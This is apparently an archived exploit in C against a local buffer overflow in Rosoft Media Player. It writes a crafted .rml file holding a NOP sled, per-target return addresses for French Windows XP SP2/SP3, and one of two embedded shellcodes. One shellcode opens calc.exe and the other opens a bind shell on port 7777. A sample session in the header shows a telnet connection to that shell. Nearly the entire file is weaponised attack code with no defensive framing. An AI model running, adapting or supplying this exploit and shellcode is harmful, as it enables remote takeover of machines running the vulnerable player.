/* rsmpf.c
*  Rosoft media player free local buffer overflow Exploit multi targets
* Coded By :
*               SimO-s0fT         (Maroc-anti-connexion@hotmail.com)
*  thanks To  :  Stack & fl0 fl0w & SKD 
*  and special thanks to str0ke for his advices and support ( you are the best brotha )
*  example :
*           ##########################################################################################
            #   Coded By SimO-s0fT                                                                   #
*           #   0                [*]Microsoft Windows Trust SP3 (Frensh):ESP                         #
*           #   1                [*]Microsoft Windows Trust SP2 (Frensh):ESP                         #
*           #   2                [*]Microsoft Windows XP SP3 (Frensh) : ESP                          # 
*           #   3                [*]Microsoft Windows XP SP2 (Frensh) : ESP                          #
*           #    USAGE :                                                                             #
*           #        exploit1.exe file.rml platform                                                  #
*           #    more information contact me { Maroc-anti-connexion[at]hotmail[dot]com }             #
*           #   failed...: No such file or directory                                                 #
*           #   C:\Documents and Settings\The Fanopsis\Bureau>exploit1 simo.rml 0                    #
*           #   [1] execute calc.exe                                                                 #
*           #   [2] execute bindshell LPORT=7777                                                     #
*           #   Choose a neumber : 2                                                                 #
*           #   simo.rml has been created!                                                           #
*           #   C:\Documents and Settings\The Fanopsis\Bureau>telnet 41.250.22.124 7777              #
*           #   Console - Windows Trust 3.0 (Service Pack 3: v55                                     #
*           #                                                                                        #  
*           #   (C) 1985-2008 Microsoft Corp.                                                        #
*           #                                                                                        #
*           #                                                                                        #
*           #   C:\Documents and Settings\The Fanopsis\Bureau>                                       #
*           ##########################################################################################
*               
********************************************************************************************************/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#define OFFSET 4096

// calc (pour tester l'exploit)
char scode1[]=
            "\x29\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa9"
            "\x21\xdb\x5b\x83\xeb\xfc\xe2\xf4\x55\xc9\x9f\x5b\xa9\x21\x50\x1e"
            "\x95\xaa\xa7\x5e\xd1\x20\x34\xd0\xe6\x39\x50\x04\x89\x20\x30\x12"
            "\x22\x15\x50\x5a\x47\x10\x1b\xc2\x05\xa5\x1b\x2f\xae\xe0\x11\x56"
            "\xa8\xe3\x30\xaf\x92\x75\xff\x5f\xdc\xc4\x50\x04\x8d\x20\x30\x3d"
            "\x22\x2d\x90\xd0\xf6\x3d\xda\xb0\x22\x3d\x50\x5a\x42\xa8\x87\x7f"
            "\xad\xe2\xea\x9b\xcd\xaa\x9b\x6b\x2c\xe1\xa3\x57\x22\x61\xd7\xd0"
            "\xd9\x3d\x76\xd0\xc1\x29\x30\x52\x22\xa1\x6b\x5b\xa9\x21\x50\x33"
            "\x95\x7e\xea\xad\xc9\x77\x52\xa3\x2a\xe1\xa0\x0b\xc1\xd1\x51\x5f"
            "\xf6\x49\x43\xa5\x23\x2f\x8c\xa4\x4e\x42\xba\x37\xca\x0f\xbe\x23"
            "\xcc\x21\xdb\x5b";
//bind shell LPORT 7777
char scode2[] =
           "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
           "\x49\x49\x49\x37\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x61"
           "\x58\x30\x42\x31\x50\x42\x41\x6b\x41\x41\x71\x32\x41\x42\x41\x32"
           "\x42\x41\x30\x42\x41\x58\x38\x41\x42\x50\x75\x6d\x39\x4b\x4c\x32"
           "\x4a\x5a\x4b\x50\x4d\x6d\x38\x6b\x49\x49\x6f\x59\x6f\x39\x6f\x35"
           "\x30\x6c\x4b\x70\x6c\x65\x74\x37\x54\x4c\x4b\x42\x65\x47\x4c\x6e"
           "\x6b\x31\x6c\x46\x65\x33\x48\x43\x31\x48\x6f\x6c\x4b\x70\x4f\x65"
           "\x48\x6c\x4b\x73\x6f\x35\x70\x37\x71\x38\x6b\x31\x59\x4c\x4b\x46"
           "\x54\x6e\x6b\x53\x31\x58\x6e\x30\x31\x6f\x30\x4f\x69\x4e\x4c\x4b"
           "\x34\x49\x50\x41\x64\x46\x67\x49\x51\x7a\x6a\x46\x6d\x43\x31\x48"
           "\x42\x5a\x4b\x38\x74\x47\x4b\x30\x54\x64\x64\x51\x38\x42\x55\x4b"
           "\x55\x4e\x6b\x53\x6f\x51\x34\x43\x31\x4a\x4b\x50\x66\x4e\x6b\x46"
           "\x6c\x42\x6b\x4c\x4b\x73\x6f\x75\x4c\x33\x31\x5a\x4b\x65\x53\x34"
           "\x6c\x6e\x6b\x6d\x59\x30\x6c\x57\x54\x55\x4c\x55\x31\x4b\x73\x74"
           "\x71\x69\x4b\x65\x34\x6e\x6b\x43\x73\x74\x70\x6c\x4b\x67\x30\x46"
           "\x6c\x6c\x4b\x70\x70\x67\x6c\x6e\x4d\x6c\x4b\x57\x30\x44\x48\x71"
           "\x4e\x72\x48\x4e\x6e\x50\x4e\x54\x4e\x38\x6c\x70\x50\x4b\x4f\x4e"
           "\x36\x71\x76\x41\x43\x31\x76\x31\x78\x76\x53\x30\x32\x53\x58\x30"
           "\x77\x44\x33\x57\x42\x63\x6f\x70\x54\x6b\x4f\x48\x50\x73\x58\x58"
           "\x4b\x58\x6d\x6b\x4c\x57\x4b\x70\x50\x6b\x4f\x6a\x76\x71\x4f\x6d"
           "\x59\x4b\x55\x65\x36\x6c\x41\x68\x6d\x53\x38\x63\x32\x42\x75\x51"
           "\x7a\x36\x62\x59\x6f\x58\x50\x71\x78\x4a\x79\x34\x49\x4b\x45\x6e"
           "\x4d\x30\x57\x69\x6f\x4e\x36\x52\x73\x41\x43\x62\x73\x76\x33\x51"
           "\x43\x70\x43\x43\x63\x73\x73\x36\x33\x6b\x4f\x4a\x70\x75\x36\x41"
           "\x78\x75\x4e\x71\x71\x35\x36\x42\x73\x4b\x39\x79\x71\x6c\x55\x70"
           "\x68\x4f\x54\x75\x4a\x32\x50\x39\x57\x52\x77\x69\x6f\x38\x56\x70"
           "\x6a\x72\x30\x50\x51\x53\x65\x4b\x4f\x58\x50\x55\x38\x6c\x64\x4c"
           "\x6d\x34\x6e\x49\x79\x66\x37\x6b\x4f\x4e\x36\x50\x53\x30\x55\x69"
           "\x6f\x4a\x70\x53\x58\x7a\x45\x41\x59\x4e\x66\x37\x39\x36\x37\x69"
           "\x6f\x59\x46\x72\x70\x50\x54\x31\x44\x33\x65\x4b\x4f\x5a\x70\x4f"
           "\x63\x51\x78\x38\x67\x50\x79\x38\x46\x43\x49\x32\x77\x4b\x4f\x4b"
           "\x66\x62\x75\x79\x6f\x6a\x70\x45\x36\x30\x6a\x52\x44\x30\x66\x41"
           "\x78\x32\x43\x72\x4d\x6f\x79\x6d\x35\x62\x4a\x42\x70\x70\x59\x74"
           "\x69\x5a\x6c\x6c\x49\x6b\x57\x41\x7a\x32\x64\x6b\x39\x68\x62\x30"
           "\x31\x6f\x30\x6b\x43\x6e\x4a\x6b\x4e\x51\x52\x34\x6d\x49\x6e\x62"
           "\x62\x36\x4c\x5a\x33\x6c\x4d\x71\x6a\x65\x68\x6e\x4b\x4c\x6b\x4e"
           "\x4b\x55\x38\x30\x72\x59\x6e\x4c\x73\x37\x66\x4b\x4f\x30\x75\x63"
           "\x74\x39\x6f\x6e\x36\x33\x6b\x36\x37\x72\x72\x31\x41\x31\x41\x46"
           "\x31\x50\x6a\x55\x51\x31\x41\x41\x41\x32\x75\x42\x71\x39\x6f\x48"
           "\x50\x50\x68\x6c\x6d\x39\x49\x45\x55\x78\x4e\x30\x53\x39\x6f\x6b"
           "\x66\x62\x4a\x79\x6f\x39\x6f\x47\x47\x39\x6f\x58\x50\x4e\x6b\x50"
           "\x57\x4b\x4c\x6c\x43\x4b\x74\x70\x64\x6b\x4f\x6a\x76\x41\x42\x49"
           "\x6f\x58\x50\x30\x68\x68\x6f\x6a\x6e\x4b\x50\x31\x70\x42\x73\x49"
           "\x6f\x58\x56\x49\x6f\x78\x50\x61";
 
struct adresses
               {char *platform;
               unsigned long addr;
               }
                systems[]=
                {
                          {"[*]Microsoft Windows Trust SP3 (Frensh):ESP",0x7D60DECB             },
                          {"[*]Microsoft Windows Trust SP2 (Frensh):ESP",0x7C85D569             },
                          {"[*]Microsoft Windows XP SP3 (Frensh) : ESP" ,0x7E498C6B             },
                          {"[*]Microsoft Windows XP SP2 (Frensh) : ESP" ,0x7C82385D             },
                          {NULL                                                                 },
                };
                         
char NOP1[]="\x90\x90\x90\x90";// n0t working
char NOP2[]="\x90\x90\x90\x90\x90\x90\x90\x90";
int main(int argc,char *argv[]){
    FILE *s;
    unsigned char *buffer;
    unsigned int RET= systems[atoi(argv[2])].addr;
    unsigned char bchars[]="\xF0\xFF\xFD\x7F";
    int i;
    int number;
    int offset=0;
   
    if (argc <2){
             system("cls");
             printf("Coded By SimO-s0fT\n");
             for(i=0;systems[i].platform;i++)
             printf("%d \t\t %s\n",i,systems[i].platform);
             printf("USAGE : \n\t");
             printf(argv[0]);
             printf(".exe ");
             printf("file.rml ");
             printf("platform\n");
             printf("more information contact me { Maroc-anti-connexion[at]hotmail[dot]com }\n");
             }
    if ((s=fopen(argv[1],"wb"))==NULL){
                                       perror("failed...");
                                       exit(0);
                                      }
    printf("[1] execute calc.exe\n");
    printf("[2] execute bindshell LPORT=7777\n");
    printf(" Choose a neumber : ");
    scanf("%d",&number);
    switch(number){
                   case 1:                     buffer=(unsigned char *) malloc (OFFSET+strlen(bchars)+strlen(NOP1)+4+strlen(NOP2)+strlen(scode1));
                                               memset(buffer,0x90,OFFSET+strlen(bchars)+strlen(NOP1)+4+strlen(NOP2)+strlen(scode1));
                                               offset=OFFSET;
                                               memcpy(buffer+offset,bchars,strlen(bchars));
                                               offset+=strlen(bchars);
                                               memcpy(buffer+offset,NOP1,strlen(NOP1));
                                               offset+=strlen(NOP1);
                                               memcpy(buffer+offset,&RET,4);
                                               offset+=4;
                                               memcpy(buffer+offset,NOP2,strlen(NOP2));
                                               offset+=strlen(NOP2);
                                               memcpy(buffer+offset,scode1,strlen(scode1));
                                               offset+=strlen(scode1);
                                               fputs(buffer,s);
                                               fclose(s);
                                               printf("%s has been created!",argv[1]);
                                               free(buffer);
                                               break;
                  
                   case 2:                     buffer=(unsigned char *) malloc (OFFSET+strlen(bchars)+strlen(NOP1)+4+strlen(NOP2)+strlen(scode2));
                                               memset(buffer,0x90,OFFSET+strlen(bchars)+strlen(NOP1)+4+strlen(NOP2)+strlen(scode2));
                                               offset=OFFSET;
                                               memcpy(buffer+offset,bchars,strlen(bchars));
                                               offset+=strlen(bchars);
                                               memcpy(buffer+offset,NOP1,strlen(NOP1));
                                               offset+=strlen(NOP1);
                                               memcpy(buffer+offset,&RET,4);
                                               offset+=4;
                                               memcpy(buffer+offset,NOP2,strlen(NOP2));
                                               offset+=strlen(NOP2);
                                               memcpy(buffer+offset,scode2,strlen(scode2));
                                               offset+=strlen(scode2);
                                               fputs(buffer,s);
                                               fclose(s);
                                               printf("%s has been created!",argv[1]);
                                               free(buffer);
                                               break;
                                          
                   }
                  
    return 0;
}

// milw0rm.com [2009-03-16]